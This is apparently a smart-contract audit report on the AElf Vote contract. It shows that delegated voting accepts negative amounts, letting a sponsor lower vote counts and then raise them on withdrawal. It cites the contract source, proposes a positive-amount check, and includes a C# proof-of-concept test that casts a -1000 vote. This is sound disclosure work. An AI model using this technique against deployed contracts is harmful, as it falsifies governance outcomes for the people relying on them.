# Audit Report

## Title
Vote Manipulation via Negative Amount in Delegated Voting

## Summary
The Vote contract fails to validate that the `amount` parameter is positive for delegated voting scenarios (`IsLockToken = false`). This allows the voting sponsor to vote with negative amounts, which directly subtracts from vote counts, and subsequently withdraw those votes to add to vote counts, enabling double manipulation of voting results.

## Finding Description

The Vote contract's `Vote()` method accepts an `amount` parameter of type `int64` (signed integer) and directly assigns it without validation for non-quadratic voting scenarios. [1](#0-0) [2](#0-1) 

The validation function `AssertValidVoteInput()` checks various conditions including option validity, voting period, and sponsor authorization for delegated voting, but does NOT validate that the amount is positive. [3](#0-2) 

For locked token voting (`IsLockToken = true`), the MultiToken contract's `Lock()` method provides amount validation through `AssertValidToken()`, which calls `AssertValidSymbolAndAmount()` to ensure `amount > 0`. [4](#0-3) [5](#0-4) 

However, for delegated voting (`IsLockToken = false`), the Lock operation is never executed, completely bypassing this validation. [6](#0-5) 

When `UpdateVotingResult()` is called with a negative amount, it performs addition using the SafeMath `Add()` extension method, which simply returns `a + b` in checked context. Adding a negative amount effectively subtracts from the vote count. [7](#0-6) [8](#0-7) 

When withdrawing a vote with negative amount, the contract subtracts the recorded amount using `Sub()`, which returns `a - b`. Subtracting a negative amount effectively adds to the vote count, enabling double manipulation. [9](#0-8) [10](#0-9) 

## Impact Explanation

This vulnerability has **CRITICAL** impact because:

1. **Vote Count Manipulation**: The sponsor can arbitrarily decrease any option's vote count by voting with negative amounts, directly manipulating governance outcomes.

2. **Double Exploitation**: Withdrawing negative-amount votes increases vote counts instead of decreasing them, allowing the sponsor to both subtract and add votes at will.

3. **Accounting Corruption**: The total `VotesAmount` can become negative or arbitrary, breaking fundamental accounting invariants of the voting system.

4. **Governance Compromise**: Delegated voting is used for off-chain oracle-style voting systems where sponsors report external voting results. This vulnerability allows complete falsification of those results.

5. **Zero Cost Attack**: Delegated voting requires no token deposits, so manipulation is completely free with no economic disincentive.

While only the sponsor can exploit this in delegated voting scenarios, this is still critical because:
- Sponsor private keys can be compromised
- Sponsors may be smart contracts with vulnerabilities
- Off-chain systems feeding the sponsor may have bugs generating negative amounts

## Likelihood Explanation

The likelihood is **HIGH** because:

1. **Low Complexity**: The attack requires only a single transaction with a negative `amount` parameter - no complex setup or chaining of operations.

2. **Minimal Preconditions**: The attacker only needs to be the sponsor of a delegated voting item (`IsLockToken = false`), which is a normal operational role.

3. **No Economic Barriers**: Delegated voting has no token cost, so there's zero economic friction to attempting the attack.

4. **Difficult Detection**: Negative amounts appear as legitimate vote records in state unless specifically audited for sign.

5. **Realistic Trigger Scenarios**:
   - Compromised sponsor keys
   - Vulnerable sponsor contracts
   - Bugs in off-chain systems feeding vote data
   - Malicious sponsor behavior

## Recommendation

Add amount validation in the `AssertValidVoteInput()` function to ensure amounts are positive for all voting scenarios:

```csharp
private VotingItem AssertValidVoteInput(VoteInput input)
{
    var votingItem = AssertVotingItem(input.VotingItemId);
    Assert(input.Option.Length <= VoteContractConstants.OptionLengthLimit, "Invalid input.");
    Assert(votingItem.Options.Contains(input.Option), $"Option {input.Option} not found.");
    Assert(votingItem.CurrentSnapshotNumber <= votingItem.TotalSnapshotNumber,
        "Current voting item already ended.");
    
    // Add validation for non-quadratic voting
    if (!votingItem.IsQuadratic)
    {
        Assert(input.Amount > 0, "Invalid amount. Amount must be positive.");
    }
    
    if (!votingItem.IsLockToken)
    {
        Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
        Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
        Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
    }
    else
    {
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        input.Voter = Context.Sender;
        input.VoteId = Context.GenerateId(Context.Self, votingResult.VotesAmount.ToBytes(false));
    }

    return votingItem;
}
```

## Proof of Concept

```csharp
[Fact]
public async Task Vote_With_Negative_Amount_Should_Manipulate_Vote_Count()
{
    // Register delegated voting item (IsLockToken = false)
    var votingItem = await RegisterVotingItemAsync(100, 3, false, DefaultSender, 1);
    
    // Initial state: option should have 0 votes
    var resultBefore = await VoteContractStub.GetVotingResult.CallAsync(new GetVotingResultInput
    {
        VotingItemId = votingItem.VotingItemId,
        SnapshotNumber = 1
    });
    resultBefore.Results.ContainsKey(votingItem.Options[0]).ShouldBeFalse();
    
    // Vote with NEGATIVE amount (-1000)
    var voteId = HashHelper.ComputeFrom("test_vote");
    var voteResult = await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        Amount = -1000,  // Negative amount!
        Option = votingItem.Options[0],
        Voter = Accounts[1].Address,
        VoteId = voteId
    });
    
    // Vulnerability: Vote count becomes NEGATIVE instead of positive
    var resultAfterVote = await VoteContractStub.GetVotingResult.CallAsync(new GetVotingResultInput
    {
        VotingItemId = votingItem.VotingItemId,
        SnapshotNumber = 1
    });
    resultAfterVote.Results[votingItem.Options[0]].ShouldBe(-1000);  // Vote count is negative!
    resultAfterVote.VotesAmount.ShouldBe(-1000);  // Total votes is negative!
    
    // Withdraw the negative vote
    var withdrawResult = await VoteContractStub.Withdraw.SendAsync(new WithdrawInput
    {
        VoteId = voteId
    });
    
    // Double manipulation: Withdrawing ADDS to the vote count instead of subtracting
    var resultAfterWithdraw = await VoteContractStub.GetVotingResult.CallAsync(new GetVotingResultInput
    {
        VotingItemId = votingItem.VotingItemId,
        SnapshotNumber = 1
    });
    resultAfterWithdraw.Results[votingItem.Options[0]].ShouldBe(0);  // -1000 - (-1000) = 0
    resultAfterWithdraw.VotesAmount.ShouldBe(0);
    
    // Sponsor can now vote with positive amount to increase vote count arbitrarily
    var voteId2 = HashHelper.ComputeFrom("test_vote_2");
    await VoteContractStub.Vote.SendAsync(new VoteInput
    {
        VotingItemId = votingItem.VotingItemId,
        Amount = 5000,
        Option = votingItem.Options[0],
        Voter = Accounts[2].Address,
        VoteId = voteId2
    });
    
    var finalResult = await VoteContractStub.GetVotingResult.CallAsync(new GetVotingResultInput
    {
        VotingItemId = votingItem.VotingItemId,
        SnapshotNumber = 1
    });
    finalResult.Results[votingItem.Options[0]].ShouldBe(5000);  // Complete manipulation achieved
}
```

### Citations

**File:** protobuf/vote_contract.proto (L141-141)
```text
    int64 amount = 3;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L94-96)
```csharp
        if (!votingItem.IsQuadratic)
        {
            amount = input.Amount;
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L122-130)
```csharp
        if (votingItem.IsLockToken)
            // Lock voted token.
            State.TokenContract.Lock.Send(new LockInput
            {
                Address = votingRecord.Voter,
                Symbol = votingItem.AcceptedCurrency,
                LockId = input.VoteId,
                Amount = amount
            });
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L169-181)
```csharp
    private void UpdateVotingResult(VotingItem votingItem, string option, long amount)
    {
        // Update VotingResult based on this voting behaviour.
        var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
        var votingResult = State.VotingResults[votingResultHash];
        if (!votingResult.Results.ContainsKey(option)) votingResult.Results.Add(option, 0);

        var currentVotes = votingResult.Results[option];
        votingResult.Results[option] = currentVotes.Add(amount);
        votingResult.VotersCount = votingResult.VotersCount.Add(1);
        votingResult.VotesAmount = votingResult.VotesAmount.Add(amount);
        State.VotingResults[votingResultHash] = votingResult;
    }
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L214-220)
```csharp
        var votingResult = State.VotingResults[votingResultHash];
        votingResult.Results[votingRecord.Option] =
            votingResult.Results[votingRecord.Option].Sub(votingRecord.Amount);
        if (!votedItems.VotedItemVoteIds[votingRecord.VotingItemId.ToHex()].ActiveVotes.Any())
            votingResult.VotersCount = votingResult.VotersCount.Sub(1);

        votingResult.VotesAmount = votingResult.VotesAmount.Sub(votingRecord.Amount);
```

**File:** contract/AElf.Contracts.Vote/VoteContract.cs (L377-401)
```csharp
    private VotingItem AssertValidVoteInput(VoteInput input)
    {
        var votingItem = AssertVotingItem(input.VotingItemId);
        Assert(input.Option.Length <= VoteContractConstants.OptionLengthLimit, "Invalid input.");
        Assert(votingItem.Options.Contains(input.Option), $"Option {input.Option} not found.");
        Assert(votingItem.CurrentSnapshotNumber <= votingItem.TotalSnapshotNumber,
            "Current voting item already ended.");
        if (!votingItem.IsLockToken)
        {
            Assert(votingItem.Sponsor == Context.Sender, "Sender of delegated voting event must be the Sponsor.");
            Assert(input.Voter != null, "Voter cannot be null if voting event is delegated.");
            Assert(input.VoteId != null, "Vote Id cannot be null if voting event is delegated.");
        }
        else
        {
            var votingResultHash = GetVotingResultHash(votingItem.VotingItemId, votingItem.CurrentSnapshotNumber);
            var votingResult = State.VotingResults[votingResultHash];
            // Voter = Transaction Sender
            input.Voter = Context.Sender;
            // VoteId = Transaction Id;
            input.VoteId = Context.GenerateId(Context.Self, votingResult.VotesAmount.ToBytes(false));
        }

        return votingItem;
    }
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Actions.cs (L195-207)
```csharp
    public override Empty Lock(LockInput input)
    {
        Assert(!string.IsNullOrWhiteSpace(input.Symbol), "Invalid input symbol.");
        AssertValidInputAddress(input.Address);
        AssertSystemContractOrLockWhiteListAddress(input.Symbol);
        
        Assert(IsInLockWhiteList(Context.Sender) || Context.Origin == input.Address,
            "Lock behaviour should be initialed by origin address.");

        var allowance = State.Allowances[input.Address][Context.Sender][input.Symbol];
        if (allowance >= input.Amount)
            State.Allowances[input.Address][Context.Sender][input.Symbol] = allowance.Sub(input.Amount);
        AssertValidToken(input.Symbol, input.Amount);
```

**File:** contract/AElf.Contracts.MultiToken/TokenContract_Helper.cs (L81-86)
```csharp
    private void AssertValidSymbolAndAmount(string symbol, long amount)
    {
        Assert(!string.IsNullOrEmpty(symbol) && IsValidSymbol(symbol),
            "Invalid symbol.");
        Assert(amount > 0, "Invalid amount.");
    }
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L92-98)
```csharp
    public static long Sub(this long a, long b)
    {
        checked
        {
            return a - b;
        }
    }
```

**File:** src/AElf.CSharp.Core/SafeMath.cs (L100-106)
```csharp
    public static long Add(this long a, long b)
    {
        checked
        {
            return a + b;
        }
    }
```
